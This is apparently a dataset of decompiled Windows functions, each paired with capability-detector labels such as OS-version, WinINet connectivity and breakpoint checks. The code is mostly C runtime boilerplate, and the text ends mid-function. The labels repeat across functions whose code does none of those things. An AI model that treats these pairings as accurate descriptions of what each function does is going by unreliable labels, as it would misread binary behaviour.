{
    "00404c98": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00404d9e: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00404da3)\n// WARNING: Removing unreachable block (ram,0x00404dd2)\n// WARNING: Removing unreachable block (ram,0x00404da9)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404c98(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00408260(0x41be70, 0x20);\n    fcn.00409da5(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if (*0x44b704 != 1) {\n        *0x44b700 = 1;\n        *0x44b6fc = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x2b770d4);\n            *(unaff_EBP + -0x30) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar1)(*0x2b770d0);\n                *(unaff_EBP + -0x2c) = piVar3;\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x28) = piVar3;\n                while( true ) {\n                    piVar3 = piVar3 + -1;\n                    *(unaff_EBP + -0x2c) = piVar3;\n                    if (piVar3 < piVar2) break;\n                    iVar4 = fcn.00405b86();\n                    if (*piVar3 != iVar4) {\n                        if (piVar3 < piVar2) break;\n                        pcVar5 = (*pcVar1)(*piVar3);\n                        iVar4 = fcn.00405b86();\n                        *piVar3 = iVar4;\n                        (*pcVar5)();\n                        iVar4 = (*pcVar1)(*0x2b770d4);\n                        piVar2 = (*pcVar1)(*0x2b770d0);\n                        if ((*(unaff_EBP + -0x24) != iVar4) || (*(unaff_EBP + -0x28) != piVar2)) {\n                            *(unaff_EBP + -0x24) = iVar4;\n                            *(unaff_EBP + -0x30) = iVar4;\n                            *(unaff_EBP + -0x28) = piVar2;\n                            *(unaff_EBP + -0x2c) = piVar2;\n                            piVar3 = piVar2;\n                        }\n                        piVar2 = *(unaff_EBP + -0x30);\n                    }\n                }\n            }\n            *(unaff_EBP + -0x1c) = 0x401218;\n            while (*(unaff_EBP + -0x1c) < 0x401224) {\n                if (**(unaff_EBP + -0x1c) != NULL) {\n                    (***(unaff_EBP + -0x1c))();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n            }\n        }\n        *(unaff_EBP + -0x20) = 0x401228;\n        while (*(unaff_EBP + -0x20) < 0x40122c) {\n            if (**(unaff_EBP + -0x20) != NULL) {\n                (***(unaff_EBP + -0x20))();\n            }\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00409cb4(8);\n    }\n    return;\n}\n",
        "token_count": 1021
    },
    "0040a324": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040a324(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00409cb4(0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0040a95b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040a95b(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41db90 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.00405b86();\n    var_14h = 0;\n    if (*0x44c000 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x40247c);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar1 == 0) ||\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x402470), \n           pcVar4 = _sym.imp.KERNEL32.dll_EncodePointer,  iVar2 == 0)) goto code_r0x0040aab8;\n        *0x44c000 = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, 0x402460);\n        *0x44c004 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x40244c);\n        *0x44c008 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x402430);\n        *0x44c010 = (*pcVar4)(uVar3);\n        if (*0x44c010 != 0) {\n            uVar3 = (*pcVar6)(iVar1, 0x402418);\n            *0x44c00c = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if ((*0x44c00c == var_18h) || (*0x44c010 == var_18h)) {\ncode_r0x0040aa67:\n        if ((((*0x44c004 != var_18h) && (pcVar4 = (*pcVar6)(*0x44c004),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x44c008 != var_18h && (pcVar4 = (*pcVar6)(*0x44c008),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x44c00c);\n        pcVar5 = (*pcVar6)(*0x44c010);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x0040aa67;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x44c000);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x0040aab8:\n    fcn.0040acd5(unaff_EBX);\n    return;\n}\n",
        "token_count": 934
    },
    "0040acd5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040acd5(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x41db90) {\n        return;\n    }\n    *0x44c138 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x44c13c = &arg_8h;\n    *0x44c078 = 0x10001;\n    *0x44c020 = 0xc0000409;\n    *0x44c024 = 1;\n    var_328h = *0x41db90;\n    var_324h = *0x41db94;\n    *0x44c02c = unaff_retaddr;\n    *0x44c104 = in_GS;\n    *0x44c108 = in_FS;\n    *0x44c10c = in_ES;\n    *0x44c110 = in_DS;\n    *0x44c114 = unaff_EDI;\n    *0x44c118 = unaff_ESI;\n    *0x44c11c = unaff_EBX;\n    *0x44c120 = in_EDX;\n    *0x44c124 = in_ECX;\n    *0x44c128 = in_EAX;\n    *0x44c12c = unaff_EBP;\n    *0x44c130 = unaff_retaddr;\n    *0x44c134 = in_CS;\n    *0x44c140 = in_SS;\n    *0x44c070 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040c772(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x4034fc);\n    if (*0x44c070 == 0) {\n        fcn.0040c772(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 831
    },
    "0040b112": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b112(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x44bd30, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.00404608();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.004045c6(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "00415b98": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00415b98(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41db90 ^ &stack0xfffffffc;\n    fcn.00403bc0(arg_10h);\n    var_14h = fcn.004186e9(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0041758b(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x00415bf1:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00415c31;\n        }\n        if (iVar1 != 2) {\ncode_r0x00415c23:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00415c31;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00415c23;\n        goto code_r0x00415bf1;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00415c31:\n    fcn.0040acd5(unaff_EBX);\n    return;\n}\n",
        "token_count": 503
    },
    "00415d17": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00415d17(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41db90 ^ &stack0xfffffffc;\n    fcn.00403bc0(arg_10h);\n    var_14h = fcn.004186e9(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.00417adc(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x00415d70:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00415db0;\n        }\n        if (iVar1 != 2) {\ncode_r0x00415da2:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00415db0;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00415da2;\n        goto code_r0x00415d70;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00415db0:\n    fcn.0040acd5(unaff_EBX);\n    return;\n}\n",
        "token_count": 502
    },
    "0041758b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0041758b(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41db90 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = str.5_v_[1];\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = str.5_v_[0] + L'\\xffffffff';\n        iVar14 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x004176cf;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x004176d6;\ncode_r0x004176cf:\n                        do {\n                            bVar6 = true;\ncode_r0x004176d6:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x004176e4;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x004176e4:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x41def4 - str.5_v_[0]) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x41def4 < iVar14) {\n                if (iVar14 < *0x41def0) {\n                    iVar14 = iVar14 + str.5_v_[3];\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = str.5_v_[3] + *0x41def0;\n                }\n                goto code_r0x00417a8f;\n            }\n            iVar13 = *0x41def4 - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = str.5_v_[0] + L'\\xffffffff';\n            iVar13 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x00417883;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x00417883:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = str.5_v_[1] + L'\\x01' + (str.5_v_[1] + L'\\x01' >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x00417a8f:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = uVar15;\n    }\n    fcn.0040acd5(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3259
    },
    "00417adc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.00417adc(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41db90 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = *0x41df14;\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = *0x41df10 + -1;\n        iVar14 = *0x41df10 + (*0x41df10 >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (*0x41df10 & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x00417c20;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x00417c27;\ncode_r0x00417c20:\n                        do {\n                            bVar6 = true;\ncode_r0x00417c27:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x00417c35;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x00417c35:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x41df0c - *0x41df10) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x41df0c < iVar14) {\n                if (iVar14 < *0x41df08) {\n                    iVar14 = iVar14 + *0x41df1c;\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = *0x41df14 + (*0x41df14 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = *0x41df14 + (*0x41df14 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = 